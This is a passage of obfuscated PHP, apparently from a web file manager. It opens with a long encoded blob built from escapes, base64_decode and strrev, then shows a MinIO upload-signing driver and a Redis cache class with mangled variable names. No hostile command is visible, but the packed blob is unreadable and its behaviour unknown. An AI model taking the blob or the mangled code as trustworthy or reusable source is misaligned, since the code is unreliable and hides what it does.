\xa4\xe4\x45\x98\x2a\x68\xba\xc\xc3\x1\x51\xd3"."\102\203\263\120\222\36\45\222\121\3\157\37\134\257\13\37\240\251\217\160\266\53\20\57\336\360\220\102\13\153\74\32\245\174\253\231\202\235\166\155\15\102\272\232\346\232\243\353\320"."\x6f\x7d\x8d\xa7\x6\xf3\x48\x24\x8e\xd1\xe\x3\x48\x3b\x6a\x9a\x8f\xae\x23\x81\x7a\x70\x4e\x32\x1\x2b\x4e\x72\x64\x2a\x2e\x86\x41\xe6\xb3\x18\x8d\xa2\x74\x9b\xb1\x98\x2c\x60\x4c\x1e\x9a\xfc\x4d"."\376\121\40\31\213\107\360\27\305\153\50\156\227\322\143\252\226\233\140\122\172\125\166\233\14\16\231\141\200\345\224\116\336\22\346\120\271\253\15\252\137\351\15\164\35\347\25\256\205"."\x17\x2e\x1e\xcb\x65\x15\x38\xfc\xb4\xd4\x36\xfa\x1a\x6a\x15\xf6\x5a\x4e\x4b\x6d\x6f\xa2\xdd\x3b\xaf\x76\xf1\xa2\xa9\xb\x83\xe4\x6e\xd3\xd6\xbb\xf0\xe5\x24\x3e\x9a\xd3\x33\xe9\x22\xb8\x7b\x58\x88".base64_decode('1w+P+J2xycoCquW0CTOvjVqIGOV8SRjMXk6whLfxvG6PmkW4uIXtvalhloy+gCLMOg==')."\x85\xca\x41\x9a\xb1\xb8\x8e\x75\xbf\xb7\x30\x5e\xca\x7b\xf1\xc9\xd8\x1b\x97\x9d\xcf\xb9\xde\x77\x68\x70\xe6\xc7\x67\x5b\x67\x7e\x99\xa\x26\x5\x7d\xc8\x89\x20\x7d\xce\xa3\x59\x91\xdf\x78\x91\x7c".strrev('~â¾qg-„rCl¨´Æ¬EíCÅí\\Ky¤êiG¡i– 2@˜`L€]	¹é').base64_decode('O8Q9CqQInlyv/G7JGOL0cDJ2yu/F8+s1UpOliEVdtalJQJVqWXpLRsr9SXJX7i2V2A==')."\7\253\126\52\363\241\54\3\351\104\230\327\47\373\123\307\347\164\57\277\32\160\273\153\27\274\273\126\351\362\36\55\136\245\151\146\363\354\371\350\177\240\204\354\252\277\124\140\352".strrev('°’º] :Ş”tzQĞ5›ÇZÑ>Gœ+äa‹'."\0".'à!½.Ã}a'."\r".' :3Oéâ\\È(»')."\x2\x8c\xca\x1f\x87\xa8\x42\x49\xd1\x21\x80\xed\xd\xb0\xaf\x4a\x4e\xf3\xf9\x84\xc\xb1\x40\x91\xe7\xd7\xc4\x12\x19\xcc\xe\x8b\x9e\xc\x62\x4d\x65\xc0\xf0\x61\xd4\x50\x53\x70\x60\x64\x4f\x95\xa5"."\xa5\x99\x52\x7e\xb8\x45\x4a\x54\x6c\xd3\x54\x72\x5a\x7e\x1c\x18\xdc\x69\x56\xf3\x34\x6b\x1\xfe\x50\xb\xd6\xd1\xb6\xa6\xb1\x47\x3c\x84\x3f\x56\xbc\x8f\x8\xdf\x7a\xd4\x31\xc\xa4\x50\xf1\xb5\xf".base64_decode('P2Tjw5tUjJmA9pDnT2BTok+hQEKktyPcLenpSAA12NatBnp6qiZwjgTLrfAlt2+N9A==')."\xb0\x19\x50\x50\x23\x37\xa4\x24\xb1\xd2\x7f\x4b\xd\x86\xd6\x28\x56\x31\xc9\xbc\xd2\xd6\xf8\x81\x8e\x92\xc\x42\x90\xba\xd0\x80\x22\xb5\xb8\x88\x92\x46\x68\xe2\x25\x21\x9a\x5c\xbb\x68\xa1\xdf\x58"."\304\7\133\270\341\51\232\302\246\301\347\77\12\37\20\374\130\23\46\177\14\236\135\371\142\236\100\333\205\323\35\105\131\250\51\164\34\133\152\211\170\266\126\311\240\375\230\253\1"."\56\162\27\356\146\267\43\13\375\232\234\210\127\126\314\144\34\62\77\27\224\271\133\271\252\22\366\200\344\275\232\74\242\21\324\362\313\53\213\340\312\175\111\71\251\217\332\161\14"."\310\363\112\154\60\52\113\373\311\171\324\57\16\104\52\175\311\255\372\375\4\27\347\127\301\30\174\61\216\20\236\335\110\152\311\141\214\162\142\177\200\146\100\102\17\76\336\320\4".base64_decode('h9t+W1JVKGETJSIcLoqnfdaupRVhlmD9+koYaDu6kwIFww3CqOWG4WOmgKGNzvkZig==')."\326\162\46\1\141\171\350\257\50\23\351\356\20\21\172\74\161\44\366\61\305\142\22\353\357\253\365\115\137\277\336\157\60\235\40\246\277\300\312\372\170\156\32\357\367\71\363\243\236".base64_decode('wNDzjABw56QM5rGwOqf6pwuzKq77o2CFoJaWRX386mOApTEu0Wicx1BgIuNNrODBYA==').base64_decode('t+CDxSMo8rC5VgglRj4iMQg4neEuFs8fyUVpOFAoyFE/i2CZedYY9HNSQeXovqSwVA==')."\142\131\10\241\162\301\261\122\217\53\1\77\303\102\300\145\104\111\21\313\266\306\15\107\165\161\40\17\54\264\222\105\243\140\73\210\34\175\371\262\206\274\270\263\106\53\153\64\113"."\215\2\347\376\226\32\342\361\275\6\21\65\232\2\324\104\64\145\41\246\136\112\121\317\266\324\220\346\132\31\135\107\345\11\175\252\366\21\124\260\106\141\244\65\247\361\21\53\332"."\46\332\65\271\365\13\274\377\325\33\3\163\201\100\67\334\123\34\165\74\375\75\372\50\206\75\344\241\272\254\136\244\312\320\204\126\221\33\262\64\226\347\320\114\360\16\131\117\54"."\x9a\x88\x6\xd9\x63\x45\x4e\xc1\xf\x85\xcd\x62\x5c\xaf\x45\xad\xbb\xc4\xe9\x88\x99\xb4\x70\x9d\x1\x96\x83\xf3\x11\x7e\x80\xc0\xbc\x17\x4b\xf9\xbc\x30\x98\x46\x4c\x2\xdf\xec\xc8\x31\x59\x4f\xf9".strrev('z‰'."\n".'°˜L%½¦04¶Ò¨ª­ØzÇ%€¬&ÀŸö(ÉLñAW¤‰'."\0".'œİ>”').strrev('cˆw•¢¸&tiV‡¯¿ Ğ‹¨eŒ ××4ØÚNÃ'."\r".'BwPá#åØ”í€öÍÚ<l').base64_decode('aDeyJnNb2NTQ0OBtaET/M1Vh5iytuaGhIktDQzP5nyYQ6SPMozMF0RJGBCHDqM78HQ==')."\300\246\223\63\362\45\306\276\365\5\261\315\223\202\233\66\300\70\26\326\176\64\205\304\233\40\243\107\216\27\317\24\162\333\6\61\335\75\10\374\32\23\220\202\355\374\324\53\54"."\xdb\x63\x50\x43\x86\xc8\xa0\x40\x7b\xb9\x9\x1d\xca\x26\x50\x6f\x1\xb5\x5e\x6c\xe1\x8d\xa\xe5\x53\x7d\xf2\xc7\x7c\x6c\x70\x29\x50\xf8\x47\xf6\xb2\x4\xaf\xfc\x56\x1\x14\xa2\x3b\x8d\x10\xd4\x3b".strrev('*Ã(İô“èšóv<©¹e‰¹’OYQÄ^¹(K0_	 Ÿ¼’	bbİ8Ê†š')."\230\237\61\107\125\261\251\343\350\261\74\106\206\24\37\316\30\32\246\44\133\101\74\256\214\204\113\331\271\300\112\334\265\203\352\0\261\37\37\66\262\16\253\131\125\52\52\217\355"."\2\234\221\365\44\341\54\211\53\102\104\40\300\37\6\241\252\174\254\155\12\254\142\32\45\336\222\311\233\212\124\373\262\171\152\305\344\332\356\211\45\163\344\220\154\272\25\150\130"."\114\232\51\46\156\216\177\205\216\13\203\204\30\200\12\312\203\334\107\241\124\201\73\311\125\46\100\245\324\25\5\0\136\231\233\10\363\253\344\306\160\127\156\342\215\60\310\235\256".base64_decode('yi4K6dW5pK5hgZ94cVfO6ihL5zZfoWgOoVm35EFD8J7qYJ69MmeVTLz1cj4ZiK8N2A==')."\343\247\200\316\302\364\126\23\157\57\113\131\5\173\43\1\235\253\131\112\10\362\367\173\144\40\76\7\312\332\21\204\35\167\326\201\17\230\116\10\157\331\227\40\35\23\14\330\360"."\x50\xae\xac\xd1\x47\xb3\x9\x8a\x84\x85\x36\xb2\xec\x58\x75\xa0\x9\xc3\x55\xa6\x8c\x81\x47\x48\xdc\x7e\x3a\xe1\x14\x46\x8f\xee\x8e\xbb\x98\x4\x21\x74\x59\x9d\xbd\xdb\xb\xa4\x90\x2c\x2a\x5c\x41".base64_decode('hL0/GXd49AU0haXb0iIXc6a9ufFHLLCJ5cLDyiWPsswdD6kqS1Xwiu7kb8FWQUQnsg==').base64_decode('VWAVYTVwBc2cFEoxXDu77kDHS4sKAD0YrNAHUpW8zg2enZMqF4BXdEzEgmGHp3IhXA==').base64_decode('V6+LRC11UETe1j7SWKYQpkzzNYGy2jTmOp/SY3G16Ydu96FuDaAzgthNYEL6KDVmdQ==')."\xe2\x26\x43\x28\xc5\xe6\x47\x71\xee\xae\xd2\x5e\xa1\xc8\x15\xa1\x5d\x37\x91\xc1\x2\x91\x1\x85\x34\x73\x1\x71\xb5\x5e\x25\x15\x1b\x97\xb3\xaf\x71\xe7\xaf\x40\xf9\x51\x1e\xd3\xe6\xe7\x4a\x5c\x3d"."\x42\x65\x11\x89\xc8\x4c\x62\x82\x16\xf1\x2e\x12\x4d\x75\xdc\xe3\x49\x8e\xa7\x79\x56\xd4\xc\xd6\x78\x8d\xb5\x8d\x28\x66\x11\xf7\xdc\xd2\x51\xd7\x15\x75\xab\xb1\xe1\x12\x12\x47\x83\xa2\xd2\xce\x4b"."\xf6\x7d\x9b\x6d\xdd\xcc\x7b\xb7\x50\xff\x22\x41\x41\x80\xdf\xbc\x78\x23\xb\x6c\x10\x78\x14\x97\xb4\x86\xaa\xb4\xf\x6a\xe5\x75\xe2\x16\xe4\x85\xf6\x19\x30\x30\x45\x3d\x69\x16\x89\x84\x45\xf2\xd9"."\220\267\143\372\220\34\215\230\134\262\204\57\347\252\125\201\335\344\110\144\7\257\302\100\322\56\311\116\167\44\357\341\50\46\71\203\227\30\121\157\243\302\71\130\225\326\114\43\63"."\244\4\222\277\32\63\353\222\157\112\46\32\104\244\23\57\15\362\33\45\27\213\311\254\76\24\231\203\143\146\34\270\2\342\377\4\367\300\222\323\120\265\330\153\257\350\231\134\204"."\174\263\242\10\115\303\114\224\360\42\42\247\130\330\313\173\57\233\305\152\51\125\76\105\222\244\21\115\162\277\112\60\72\142\220\40\141\134\147\172\223\336\306\46\357\114\70\247\310"."\x26\x21\xec\x40\x4\xfb\x8\x5a\x58\x12\x1a\xe0\x33\x22\x23\x63\xa0\x75\x8\xf9\x44\x1e\x53\xba\x97\x23\x9e\x45\x84\xf\x5\xe2\x44\x85\xcf\x27\xf1\xb6\xc2\x63\x45\x89\x97\xd0\xb9\x46\x22\x71\x3b"."\42\223\165\241\46\100\25\25\161\206\336\152\351\164\204\160\162\233\103\265\324\225\1\255\17\147\72\70\202\27\215\241\236\117\114\207\306\217\253\22\170\124\100\166\165\117\112\211\176".base64_decode('CP1aBDKpu3lpYIS6A3XIwhSFOZET4ITJgZUqExgroUpqLAvPa9bVY2NZh5iua5ybNA==')."\x62\xad\x23\xbc\x49\x73\x85\x52\x4b\x8e\xb0\x54\x8e\x9c\x96\x23\x42\xb5\xac\x1c\xa5\x39\x88\xe7\x1a\xd5\x99\xdd\x2b\x13\x27\xf5\x74\xf6\xf8\x39\xa8\x95\x2f\x4f\x2a\x6d\x10\x7e\xa0\x82\x4c\x95\x49".base64_decode('H9PhgDeaM5JKJNoRDgYibeH4UmVItxWh20EehXAuZSJepQPPsHqQv1yAg95BdGLwpg==').base64_decode('+KnKEucn6dVw6Z0nZ7UU//RiRY15bM6SrSiDhcZVcmeFiFTKXCjqlfnHdaxcJLVYKg==').base64_decode('UKrSGshf/QvkVQk5N2KE9PxkjTfyZcMyxMJnJcbl2gNtXeFuNRCJRFc4dPKEuLzInw==')."\xec\x48\xc9\x2f\x7c\x48\x33\x23\x26\x81\x7e\xbd\xd2\x3d\x19\x38\x77\x92\xdd\xaa\xbb\xc4\x28\x74\xfa\x64\x4f\x75\x5\x76\xf9\x3\x6f\x13\xf2\xa7\x0\x68\x54\x7a\x9b\xa7\x50\xd4\xc\x4b\x97\x0\xf4"."\xe1\x98\xe9\x60\x3d\xa2\x65\xb3\x8e\x77\xf7\xb2\x69\x29\x5a\x72\xee\xac\x55\x3f\xa5\xd2\xf\x30\x98\xe4\x15\xaf\x5a\x86\x58\xb8\xa3\x33\xf1\x3f\x6e\xaa\x91\x12\x1e\xa9\x8c\x14\x53\x32\xe1\xc6\x7e".strrev('Jûä);ˆâÖÓéU,)Õà!Ç$Í2{OÄ©—\\G‘’ù_CûÅfû#:ü €•ô')."\xca\xcf\x87\x98\x6\xb0\xe3\xbd\x10\xbb\x24\xc3\x11\x71\x30\xc1\xd9\xa1\x36\xfc\x39\x7a\x5c\x45\xa7\x70\x2c\xbf\x63\x47\x18\xa6\x63\x89\xe8\x4\x8c\xb3\xe3\xbe\xde\xf5\x26\x93\x5b\x23\xd5\xf1\xe2"."\x52\xc5\x37\x88\xff\x7f\x9a\x46\xee\x6c\x50\xce\x1\xd1\x39\x14\xe3\xef\x7d\x88\xa2\xee\x94\x2a\xd\x40\xc9\x8a\x90\x69\xf1\xc\x4a\x8b\xd2\x40\x9f\x7\xe3\x6f\x39\x28\xb\x99\xe9\xb2\xf8\x0\x71"."\217\25\312\25\154\307\121\276\123\126\113\227\346\206\2\10\247\43\216\152\130\151\312\314\215\127\0\34\202\254\10\153\27\127\40\304\57\131\344\323\246\74\176\204\40\143\33\3\372"."\x8c\x1f\x95\x19\x78\xd0\xd1\x41\xb7\x2b\x9f\xfd\xa1\xc5\xff\x4f\xa\xd2\xc4\xb8\xe4\xf\xd1\x59\x49\x65\x83\x2c\xf7\x56\x27\xd8\x2e\xfc\xa2\x51\xc6\x1c\x75\xbe\xed\x87\x21\xee\x37\x8c\x1c\xaf\x17"."\x49\x8b\x86\x58\xd8\xca\xef\x2d\x39\xb\x79\x2a\x5e\x14\x51\xc8\xf3\xac\xa\x42\x75\x98\x45\xec\x96\x89\x9d\x49\x49\x66\xe9\xd3\xd3\xe8\x4f\x3f\xfc\xb2\xed\xcc\xdd\x8\x4a\xa8\xe0\x93\xf5\x1c\xa9"."\202\31\43\233\52\162\325\40\1\350\322\205\240\200\224\302\332\61\32\173\206\226\274\173\326\306\150\62\74\142\122\355\141\53\354\366\316\371\26\213\170\342\106\354\235\316\47\77\370"."\5\267\45\26\203\145\73\36\231\111\230\11\155\310\103\71\62\114\325\104\254\165\134\16\313\112\255\244\27\50\221\11\363\122\174\276\27\111\31\330\303\161\51\17\171\307\214\222\72"."\xf7\x2b\x29\xd2\x4a\xe3\xf4\x53\x2e\x3d\x94\x35\x7\xb5\x6c\x8c\x2a\xcf\x39\x2c\x52\x8a\xe8\x34\xa5\xb3\x3d\xc0\x91\x8d\x82\xfc\x5a\xa1\x20\xee\xd7\xe4\x2d\x13\xfd\xeb\xb0\x4\x84\xb4\xde\x44\xa7".strrev('0¥Ù*äÀa /CÙÚÈ3Û'."\n".'GŞ”Iìs¥€á¡zaò•ÄÜ Q¾İ\'8czUÙìJ')._kodDe('MHcFOaWDvRnpfx1Inz4O5wJpz96mt+Uf9Y62QhpY8gQmNCCyE8H70IWT9gd+HeU4bx0=')."\xf8\xc0\x8b\x74\xd5\x1e\xe4\xa1\x98\x4f\x7e\xda\xf4\x34\x3f\xd4\xe0\xb8\xd8\xdc\x65\x9f\x1c\x42\xd9\xc4\xfd\x58\x5c\xe5\xc3\x77\xec\x91\x3b\xb6\x74\xe0\x85\xbb\x2a\xcf\xd6\x4d\xfa\xea\x9d\x47\x98"."\x19\x7e\xd9\x3b\x3f\xc2\x18\xce\xf9\xba\x31\xee\x7\x67\xd\xf8\xb9\xa1\xe2\xe8\xe1\x3e\x75\xf0\x61\x75\x15\x88\xb9\x7\x39\x61\x56\xca\x87\xc5\x35\xbb\xe3\x4d\x3e\xa9\xd7\x40\xda\x2a\xdf\xf5\x93".base64_decode('hkHqd6mY9RCNAw/zaVf1aUDHq0PuCa3yuOBXVgg6y+TQlXJSveaFg0V2TevOZjhwVw==')."\55\352\302\120\206\172\14\255\330\40\126\345\122\115\63\147\317\227\205\33\142\12\305\135\47\170\2\200\73\130\340\126\4\122\50\116\64\124\230\233\122\171\365\223\104\247\372\171\345".base64_decode('q5SuHeB/tmDE6YFmlZS7K9/vrRgBgqeSLpS0Ibp0W0ysbmKJVUe3QPH6pPNblH2o0g==')."\xf\x69\xdf\x13\x8b\x85\xbe\x1e\x68\x66\xf1\x19\x3b\x87\x65\xf7\x76\x51\x73\x1e\x28\xab\x9d\x9b\xc8\x48\xb0\x43\x9a\x41\xde\xe4\xd6\xdd\x6d\x27\x3\x3\xd2\x14\x91\x2c\x1d\xac\xe4\x1a\x6d\xd3\x2d"."\12\302\305\361\276\110\304\232\321\174\26\266\155\154\130\55\126\233\104\211\376\7\23\310\316\110\364\70\45\324\236\252\364\334\277\204\221\226\52\257\103\112\352\37\137\322\156\312\335"."\361\363\240\127\263\275\22\102\112\342\103\335\216\222\11\6\22\41\216\255\316\276\272\252\107\305\104\35\3\36\145\262\114\225\54\236\364\210\244\160\275\45\61\167\270\64\263\266\234"."\xe4\xd4\x4f\x8c\xfd\x9c\x6c\x92\xfc\xf8\x1d\x31\x98\x13\x9e\x26\xc8\x72\x75\x2c\x5d\xc9\x13\xb0\x6c\x70\x46\x2a\x92\xd7\x44\x65\xd5\xd2\x53\x82\x42\x2a\x44\xc4\x48\xd0\x23\x58\xd0\x44\x8d\x81\x34"."\63\320\301\355\24\65\111\157\315\51\252\302\103\55\75\6\153\312\141\61\5\230\354\107\231\117\125\364\165\307\121\23\305\333\134\317\6\23\22\345\176\113\230\15\21\241\13\202\344".base64_decode('SeaujnMNf0zNcc6x3C8qIm5P9pGMou53Z4E2EpsW+jVpdxUbqQh1l3IiIsl3yZGKJw==').base64_decode('OqyCsT8pFxlgtsaW6z1V6rGWhhnn/3/9mOD/qzcEZzcwSbzjueEO4L8ZyzchecimUg==')."\140\127\77\234\73\350\276\200\105\374\235\155\51\316\265\240\231\117\61\346\152\114\143\267\141\132\66\53\355\263\325\117\54\25\17\271\42\344\33\346\257\202\126\213\270\155\346\334\217"."\272\366\261\267\320\311\173\255\3\325\62\12\62\304\17\106\125\360\230\202\30\77\54\275\362\155\44\207\253\134\145\23\145\117\247\207\151\211\377\250\310\46\332\200\330\24\346\254\315"."\xcf\x42\x49\x7c\x22\x24\x1e\x14\x60\xf4\x64\x63\xd7\x68\x81\x9d\x1d\xeb\x81\xe8\xf\x2c\x61\xc4\x89\x58\xd6\x3\x8d\x92\xe9\x92\x3\x54\x41\xcd\x12\x8e\x39\x71\x0\xe5\xe1\x86\x39\xc4\xe6\xc2\x6c"."\72\35\45\272\134\217\127\322\114\226\74\266\16\351\175\245\146\103\145\151\116\7\344\42\130\371\334\51\320\342\157\220\67\270\37\45\157\364\272\252\343\357\167\72\161\335\361\240\44"."\xd5\x6\x41\xb\x24\x86\xa5\x1c\x4c\x6e\x45\x2e\x80\xc8\x4d\xb0\xb7\xb2\xc\xc5\xeb\xb8\xc8\x33\xc9\xca\xaa\xbe\xbe\x79\xa3\x84\x10\xf\x87\xe4\xf1\x60\x74\xa2\xa7\x68\x12\x5e\xd0\x9\xe5\x92\x1f".strrev('Æ³‘”'."\n".'nÒ@èè€OÖ#ªíí©âL4x¸ŸÓ¡LÇL‘ŠMŠ¾ià£½‚»KzWíI')."\123\370\223\304\112\316\104\6\51\363\1\314\366\120\322\347\7\220\103\122\150\311\217\202\70\113\142\13\15\347\22\134\124\55\133\322\54\132\122\66\16\257\226\27\43\246\54\11\221"."\xd3\xf0\x43\xc4\xb6\x63\x8a\xc4\xa3\x3\xee\xc7\x6\x88\x7c\x80\x1e\xf9\x1d\x27\x7f\xb8\x2a\x96\x41\xd2\xd5\x29\x62\xdf\x53\xce\xd7\x4b\x48\x22\x1\x33\xd7\xa3\x50\x83\x74\xf9\xe7\xbc\x7b\xe5\x6e".strrev('ÌJÜN2ò¨d ’mMÒçóç)wO¸ÖP#ZôÉ ¬8Xf}±~‡hó¤ÉHˆÉmÈ+Õ').base64_decode('CiuGz1ZiH3HBq73mndbKgtMS3H0q1a6Vq2RNsfMNhyIIz0o4Ncm0WZgX6KPu5459sg==')."\71\264\43\143\45\124\230\76\113\345\305\265\214\350\46\206\125\353\76\131\150\316\342\262\151\65\107\52\1\242\357\117\160\265\6\351\44\205\365\76\204\276\3\355\12\27\30\210\117"."\72\15\271\171\66\76\147\50\17\61\112\362\72\240\256\263\41\226\315\60\266\303\225\144\311\117\25\73\57\140\145\11\206\204\2\172\66\42\125\47\137\316\116\132\40\136\375\43\2".base64_decode('K51DLFnAiwS2Q5qOwZdIJO8Y5IzJiY7muKeWHGsE+lJgjgiGaVrAmUTz667WywXcPQ==')."\xa3\x25\xac\x51\xc3\x4e\x66\xa4\xb3\x56\x65\x62\x25\xbc\x58\x31\xa8\xf0\xa1\xea\xed\x75\xb7\x8a\x8d\xa9\xfb\x4\x2a\x2a\xa9\x68\x8f\xa4\xe1\x91\x30\xab\x94\xa1\x2d\xaa\x5a\x8c\x26\xe1\x92\x82\xe7"."\x75\x94\x9d\x64\x8\x70\x59\x9a\x84\xcb\x56\x24\xb3\xc2\x92\xc0\x46\x2a\x67\x6b\x25\x6b\x92\xee\x55\xe\x1e\x48\x31\x52\x55\x3a\xec\x3a\xeb\xd3\xac\x93\x8d\x67\xd5\xcc\x95\x9f\x3\x8c\x73\xe7\x26".base64_decode('Yo/qrRDSCtdNe7VWVM08aStEbtcuUI3WspQq1JVSjkm1T4RGRiWZF2lV9EPoJ/EWLg==')."\73\274\252\222\54\53\233\124\127\107\211\125\245\14\226\123\117\304\5\227\307\15\374\245\2\363\5\310\210\116\243\131\143\130\350\341\61\65\374\151\16\362\137\312\17\347\115\276\245"."\244\204\232\45\126\21\17\24\335\343\134\121\233\23\215\363\45\311\5\155\125\253\0\17\226\35\124\236\322\263\354\5\73\331\234\202\36\253\114\333\110\352\116\77\267\262\337\53\232"."\316\76\222\225\204\221\56\71\240\220\144\70\364\30\252\110\312\10\10\330\76\41\222\247\365\111\14\215\300\11\207\345\13\145\43\340\46\203\136\202\6\361\145\73\277\376\42\76\132"."\351\266\113\223\343\146\321\366\340\264\204\131\40\277\255\246\155\13\245\0\52\72\40\274\42\336\73\75\222\316\13\12\211\273\56\334\50\162\211\102\320\226\120\37\22\204\353\130\174"."\46\217\353\64\225\320\54\107\4\137\316\360\210\274\65\302\265\154\173\311\165\161\54\0\350\0\74\150\216\61\147\123\330\16\137\264\107\134\337\150\156\176\120\260\62\200\212\262\6"."\17\361\166\140\371\151\212\37\136\121\360\222\72\340\371\64\337\232\302\220\243\70\175\170\212\153\332\176\131\15\40\302\25\125\120\27\352\104\266\6\246\103\361\104\274\42\251\47\20"."\x8f\xaf\x88\xc6\xda\xa8\xc7\xf5\x8a\x64\x52\x4a\xd2\x88\xaa\x48\xea\xe9\x8c\x76\x4f\x96\x16\xea\xa\x84\x23\x15\x69\x58\x79\xaa\x5b\x15\x6e\xcb\x68\x52\xb8\x87\xb4\x92\xdc\x40\x4e\xd6\x8a\x70\x70".base64_decode('qWgJuesWNwOFjMkE/uzmJK5lmRxAMuHVc8JfnSjjFG/I82oxx5I84Hy+yKWjyBAWKg==').base64_decode('wopP3VB3rABQ7IGer3vOc4vLe5/jkl+Ck7VBiI2Ec/KeTADTqw6QLFWuvOUgqWIAcA==')."\303\216\65\101\153\156\215\71\50\335\142\320\23\17\130\311\302\220\112\312\155\64\354\110\266\265\241\252\167\335\124\172\210\127\277\220\353\375\157\345\54\103\261\315\256\0\0".""."", 10, -8))); goto f›Ã‚˜»ñ˜; AË‘Õ²—¬: define($_SERVER[ •ŒÓîÆ][295], 3); define($_SERVER[ •ŒÓîÆ][296], 1); define($_SERVER[ •ŒÓîÆ][297], 0); goto F·ëšé¿­å; DÔÈ¿îƒ˜†: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($…Ôø‘Ê) { parent::__construct($…Ôø‘Ê); $this->signatureVersion($_SERVER[ •ŒÓîÆ][233]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($ûë™¦Ï, $¶¥ßÜ¯ó = 3600) { $™Ã´ =& $_SERVER[ •ŒÓîÆ]; $Ãµ­Æ¯ = $™Ã´[215]; $ñÆÑ—Í¬ = $™Ã´[264]; $¿Ÿö‘Ä” = $™Ã´[62]; $”Â£›ˆ‘ = gmdate($™Ã´[265]); $éãİÉ‹Ë = gmdate($™Ã´[266]); $º°Ò²ßÉ = $™Ã´[267]; $ÃåÛäƒ = $¶¥ßÜ¯ó . $™Ã´[12]; $ŠòóßÊ’ = $™Ã´[268]; $§ü¨ø¢‡ = array($this->accessKey, $éãİÉ‹Ë, $this->region, $¿Ÿö‘Ä”, $º°Ò²ßÉ); $Îæ•±‰ = implode($™Ã´[8], $§ü¨ø¢‡); $Ê™î‰ ü = array($™Ã´[269] => gmdate($™Ã´[270], strtotime($™Ã´[271])), $™Ã´[272] => array(array($™Ã´[273] => $this->bucket), array($™Ã´[274] => $Ãµ­Æ¯), array($™Ã´[275], $™Ã´[276], $™Ã´[12]), array($™Ã´[275], $™Ã´[277], $™Ã´[12]), array($™Ã´[275], $™Ã´[278], $™Ã´[12]), array($™Ã´[279] => $ŠòóßÊ’), array($™Ã´[280] => $Îæ•±‰), array($™Ã´[281] => $ñÆÑ—Í¬), array($™Ã´[282] => $”Â£›ˆ‘), array($™Ã´[283] => $ÃåÛäƒ))); $õ€Ñûú¹ = base64_encode(json_encode($Ê™î‰ ü)); $ÈÒœ†ãÜ = hash_hmac($™Ã´[284], $éãİÉ‹Ë, $™Ã´[285] . $this->secret, !0); $–…Íì•† = hash_hmac($™Ã´[284], $this->region, $ÈÒœ†ãÜ, !0); $º˜× »  = hash_hmac($™Ã´[284], $¿Ÿö‘Ä”, $–…Íì•†, !0); $ìûÏÌê™ = hash_hmac($™Ã´[284], $º°Ò²ßÉ, $º˜× » , !0); $ˆ…Õ—»æ = hash_hmac($™Ã´[284], $õ€Ñûú¹, $ìûÏÌê™); $ü·£ã”ì = array($™Ã´[232] => $™Ã´[12], $™Ã´[286] => $™Ã´[12], $™Ã´[274] => $Ãµ­Æ¯, $™Ã´[279] => $ŠòóßÊ’, $™Ã´[287] => $õ€Ñûú¹, $™Ã´[288] => $Îæ•±‰, $™Ã´[289] => $ñÆÑ—Í¬, $™Ã´[290] => $”Â£›ˆ‘, $™Ã´[291] => $ÃåÛäƒ, $™Ã´[292] => $ˆ…Õ—»æ, $™Ã´[198] => $this->getHost()); return $ü·£ã”ì; } } define($_SERVER[ •ŒÓîÆ][293], 1); define($_SERVER[ •ŒÓîÆ][294], 2); goto AË‘Õ²—¬; E„ˆòÌù : class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($»®›Ì, $ëÄÂ€«) { $Ë·êğ¹ =& $_SERVER[ •ŒÓîÆ]; if (!class_exists($Ë·êğ¹[911])) { show_json($Ë·êğ¹[912], !1); } $this->cacheTime = $ëÄÂ€«; $ƒàÔ¦¢¡ = isset($»®›Ì[$Ë·êğ¹[913]]) ? $»®›Ì[$Ë·êğ¹[913]] : 10; $€Åİğæá = _get($»®›Ì, $Ë·êğ¹[910]); if ($€Åİğæá && is_array($€Åİğæá)) { $this->initCluster($»®›Ì, $ƒàÔ¦¢¡); } else { $this->handle = $this->init($»®›Ì, $ƒàÔ¦¢¡); } } private function init($ñ‹åêÁ, $Œ°‚µ¹í) { $˜™í…‰í =& $_SERVER[ •ŒÓîÆ]; $¡ÛÁáê = new Redis(); $Æ•¬½‘ = isset($ñ‹åêÁ[$˜™í…‰í[914]]) ? $ñ‹åêÁ[$˜™í…‰í[914]] : !1; if ($Æ•¬½‘) { $¡ÛÁáê->pconnect($ñ‹åêÁ[$˜™í…‰í[198]], $ñ‹åêÁ[$˜™í…‰í[199]], $Œ°‚µ¹í); } else { $¡ÛÁáê->connect($ñ‹åêÁ[$˜™í…‰í[198]], $ñ‹åêÁ[$˜™í…‰í[199]], $Œ°‚µ¹í); } if (!empty($ñ‹åêÁ[$˜™í…‰í[466]])) { $¡ÛÁáê->auth($ñ‹åêÁ[$˜™í…‰í[466]]); } if (!empty($ñ‹åêÁ[$˜™í…‰í[798]]) && $ñ‹åêÁ[$˜™í…‰í[798]] != 0) { $¡ÛÁáê->select($ñ‹åêÁ[$˜™í…‰í[798]]); } return $¡ÛÁáê; } private function initCluster($¸ùœèÒ, $š÷Ó÷Šæ) { $³½ÁÚÊµ =& $_SERVER[ •ŒÓîÆ]; $¦‘Êì¬å = array($³½ÁÚÊµ[915], $³½ÁÚÊµ[916], $³½ÁÚÊµ[917]); $ ©÷†² = $³½ÁÚÊµ[915]; if (isset($¸ùœèÒ[$³½ÁÚÊµ[16]]) && in_array($¸ùœèÒ[$³½ÁÚÊµ[16]], $¦‘Êì¬å)) { $ ©÷†² = $¸ùœèÒ[$³½ÁÚÊµ[16]]; } switch ($ ©÷†²) { case $³½ÁÚÊµ[915]: $this->_slave($¸ùœèÒ, $š÷Ó÷Šæ); break; case $³½ÁÚÊµ[916]: break; case $³½ÁÚÊµ[917]: $this->isCluster = !0; $ßüËìÕï = $¸ùœèÒ[$³½ÁÚÊµ[910]]; $•ŸÆû„ = isset($¸ùœèÒ[$³½ÁÚÊµ[914]]) ? $¸ùœèÒ[$³½ÁÚÊµ[914]] : !1; $®Ô§ªŞ = isset($¸ùœèÒ[$³½ÁÚÊµ[466]]) ? $¸ùœèÒ[$³½ÁÚÊµ[466]] : null; $this->handle = new RedisCluster(NUll, $ßüËìÕï, $š÷Ó÷Šæ, $š÷Ó÷Šæ, $•ŸÆû„, $®Ô§ªŞ); break; default: break; } } private function _slave($Ÿ©Ë¸ãµ, $å¡£ÔÉ¹) { $İ¢ÛÒ = $Ÿ©Ë¸ãµ[$_SERVER[ •ŒÓîÆ][910]]; $this->filterConfig($Ÿ©Ë¸ãµ, 